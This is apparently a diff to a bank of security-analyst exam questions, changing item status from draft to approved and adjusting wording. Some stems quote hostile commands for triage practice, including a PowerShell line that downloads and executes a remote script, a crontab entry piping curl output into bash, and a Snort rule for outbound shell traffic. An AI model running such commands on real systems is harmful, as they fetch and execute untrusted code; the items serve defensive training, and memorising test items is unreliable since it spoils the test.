@@ -6,7 +6,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "An analyst finds a long string of letters and digits ending in `=` inside a script. What is CyberChef built to do with it?",
@@ -45,7 +45,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "An analyst has a saved capture open in Wireshark and wants to read the full text exchanged in one conversation between two hosts. Which Wireshark feature does this?",
@@ -86,7 +86,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A server has no graphical interface. A responder must record only traffic to and from `198.51.100.23` on port 443 into a file for later analysis. Which command does that?",
@@ -125,7 +125,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A team runs Suricata inline in front of a file server. An analyst changes a rule's first keyword from `alert` to `drop`. What changes?",
@@ -137,7 +137,7 @@
         },
         {
           "id": "b",
-          "text": "Matching packets are discarded as well as logged"
+          "text": "Matching packets are discarded as well as being logged"
         },
         {
           "id": "c",
@@ -164,7 +164,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 1,
     "stem": "A CSIRT wants platforms that store and share structured threat intelligence with partner organizations. Which TWO fit?",
@@ -212,7 +212,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "A Snort sensor raises an alert from the rule below for `ws-0412.example.internal`. What does a match mean?\n\n```\nalert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:\"Outbound shell port\"; flow:established,to_server; sid:1000042; rev:2;)\n```",
@@ -220,7 +220,7 @@
       "options": [
         {
           "id": "a",
-          "text": "An internal host has an open session outward on port 4444"
+          "text": "An internal host has an established session outward on port 4444"
         },
         {
           "id": "b",
@@ -251,7 +251,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "An analyst deploys Zeek on a network tap. What does it mainly produce for the team to search?",
@@ -290,7 +290,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Which SIEM capability lets an analyst see that one account failed to sign in on many hosts within a few minutes?",
@@ -331,7 +331,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "A SIEM rule fires on the lines below. What should the analyst conclude first?\n\n```\n10:02:11 user=jdoe src=203.0.113.50 action=failure\n10:02:13 user=jdoe src=203.0.113.50 action=failure\n10:02:14 user=jdoe src=203.0.113.50 action=failure\n10:02:16 user=jdoe src=203.0.113.50 action=failure\n10:02:18 user=jdoe src=203.0.113.50 action=success\n10:04:40 user=jdoe src=10.20.4.12 action=success\n```",
@@ -372,7 +372,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 3,
     "stem": "Which THREE parts of this command line deserve scrutiny during triage?\n\n```\npowershell.exe -w hidden -enc <string> ; IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.5/p\")\n```",
@@ -421,7 +421,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Which description fits OTX?",
@@ -462,7 +462,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "An EDR console shows `winword.exe` starting `powershell.exe` with an encoded command on a laptop. Which first response contains the host and keeps the evidence?",
@@ -503,7 +503,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A salesperson reports a tablet lost at an airport; it holds the company mailbox and documents. Which action in the MDM console best limits exposure?",
@@ -545,7 +545,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "A domain in a phishing link looks brand new. Which lookup shows when it was created and through which registrar?",
@@ -586,7 +586,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "An analyst checks `203.0.113.77` from firewall logs on AbuseIPDB and sees a high confidence score with many recent reports. How should the result be used?",
@@ -625,7 +625,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "Before detonating a suspicious attachment, which TWO actions are safe static analysis steps?",
@@ -669,7 +669,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A user's VPN sign-ins show GeoIP locations in two countries 20 minutes apart. What does this most likely indicate?",
@@ -713,7 +713,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A file hash submitted to VirusTotal returns zero detections and a first-seen time of two minutes ago. What is the best reading?",
@@ -752,7 +752,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "Which file would this YARA rule match?\n\n```\nrule Invoice_Loader {\n  strings:\n    $a = \"cmd.exe /c\" ascii\n    $b = { 4D 5A 90 00 }\n    $c = \"invoice_\" ascii\n  condition:\n    $b at 0 and ($a or $c)\n}\n```",
@@ -793,7 +793,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "Joe Sandbox returns a report for a sample with no network calls after 60 seconds, but the sample contains a long sleep routine. What is the likely issue?",
@@ -832,7 +832,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Cuckoo Sandbox is open source. What does it do with a submitted file?",
@@ -873,7 +873,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 3,
     "stem": "An XDR platform links a phishing message to a later suspicious sign-in. Which TWO data sources let it make that link beyond endpoint telemetry?",
@@ -919,7 +919,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "Which regular expression matches an address written as four groups of one to three digits separated by literal dots, such as `10.20.4.12`?",
@@ -958,7 +958,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "An EDR alert shows the command line below, started by a spreadsheet. What does it most strongly indicate?\n\n```\npowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...\n```",
@@ -970,7 +970,7 @@
         },
         {
           "id": "b",
-          "text": "Hidden execution of an encoded script that needs decoding"
+          "text": "Hidden execution of an encoded script that still needs decoding"
         },
         {
           "id": "c",
@@ -1000,7 +1000,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A crontab entry on a web host reads `*/5 * * * * curl -s http://198.51.100.9/x.sh | bash`. What is the main concern?",
@@ -1039,7 +1039,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "A message claims to come from the finance director but fails SPF. Which MXToolbox lookup shows what the sending domain tells receivers to do when SPF and DKIM checks fail?",
@@ -1082,7 +1082,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "A UEBA platform alerts that an engineer downloaded 40 times more data than their 90-day norm at 03:00. Which technique produced the alert?",
@@ -1123,7 +1123,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "Which TWO statements about structured log and rule formats are accurate?",
@@ -1172,7 +1172,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 2,
     "stem": "Which statement describes OpenUBA?",
@@ -1213,7 +1213,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Which Python call turns the JSON text held in a string variable `raw` into a dictionary?",
@@ -1254,7 +1254,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 3,
     "stem": "An analyst exports a Windows event log from a suspect host as an EVTX file. Why can the file not be read in a plain text editor?",
@@ -1296,7 +1296,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-single",
     "difficulty": 1,
     "stem": "Which PowerShell command reads events from the Security log on the local Windows host?",
@@ -1335,7 +1335,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "mcq-multi",
     "difficulty": 2,
     "stem": "An analyst pastes the headers of a reported message into MXToolbox. Which TWO findings suggest spoofing?",
@@ -1385,7 +1385,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-terminal",
     "difficulty": 2,
     "pbqWeight": 3,
@@ -1621,7 +1621,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-data",
     "difficulty": 2,
     "pbqWeight": 4,
@@ -1766,7 +1766,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-hotspot",
     "difficulty": 2,
     "pbqWeight": 6,
@@ -1902,7 +1902,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-match",
     "difficulty": 1,
     "pbqWeight": 5,
@@ -1988,7 +1988,7 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-config",
     "difficulty": 3,
     "pbqWeight": 5,
@@ -2117,11 +2117,11 @@
     "objectiveIds": [
       "1.3"
     ],
-    "status": "draft",
+    "status": "approved",
     "type": "pbq-order",
     "difficulty": 2,
     "pbqWeight": 5,
-    "stem": "Put the triage steps for a suspicious attachment in the order an analyst should perform them.",
+    "stem": "Put the triage steps for a suspicious attachment in the order an analyst should perform them. Rules: start with the check that needs the least access to the file, and never run the file until every step that only reads it is done.",
     "payload": {
       "steps": [
         {
